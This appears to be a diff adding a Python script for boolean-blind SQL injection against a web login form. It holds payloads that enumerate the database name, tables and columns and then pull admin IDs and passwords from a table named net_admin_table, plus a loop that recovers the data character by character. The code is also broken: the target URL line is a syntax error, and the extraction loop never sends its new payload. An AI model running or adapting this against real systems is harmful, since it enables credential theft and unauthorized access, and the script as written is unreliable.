@@ -1,0 +1,58 @@
+#conding = utf-8
+
+'''
+Author: Ghost
+ and 1=1 
+ and length(database())=1
+(select group_concat(table_name) from information_schema.tables where table_schema=database())
+(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65)
+(select concat(admin_id,0x3a,admin_pass) from net_admin_table)
+'''
+
+import requests
+import string
+
+url = "xxxxx" 目标url
+
+char_s = string.printable.strip()
+
+for i in range(1,1001):
+    data={
+    "username":f"1' or length(database())={i}#",
+    "password":"",
+    "submit":""
+    }
+
+
+
+    payload = f"1' or length(database())={i}#"
+    #payload = f" and length((select group_concat(table_name) from information_schema.tables where table_schema=database()))={i}"
+    #payload = f" and length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65))={i}"
+    #payload = f" and length((select concat(admin_id,0x3a,admin_pass) from net_admin_table))={i}"
+
+    
+    print(f"[INFO] 正在测试内容长度是否为:{i}...")
+
+    if "history.go(-1)" in requests.post(url = url,data = data).text:
+        cont_length = i
+        break
+
+print(f"\033[32m[RESULT] 内容的长度为: {cont_length}\033[0m")
+
+cont = ""
+
+for i in range(1,cont_length + 1):
+    print(f"[INFO] 正在测试内容的第{i}位")
+    for j in char_s:
+        payload = f"1' or ascii(substr(database(),{i},1))={ord(j)}#"
+        #payload = f" and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{i},1))={ord(j)}"
+        #payload = f" and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x6d65745f61646d696e5f7461626c65),{i},1))={ord(j)}"
+        #payload = f" and ascii(substr((select concat(admin_id,0x3a,admin_pass) from net_admin_table),{i},1))={ord(j)}"
+
+    
+        if "history.go(-1)"  in requests.post(url = url,data=data).text:
+            cont += j
+            print(f"[INFO] 正在测试内容的第{i}位,为{j}")
+            break
+    
+print(f"\033[32m[RESULT] 内容为{cont}\033[0m")
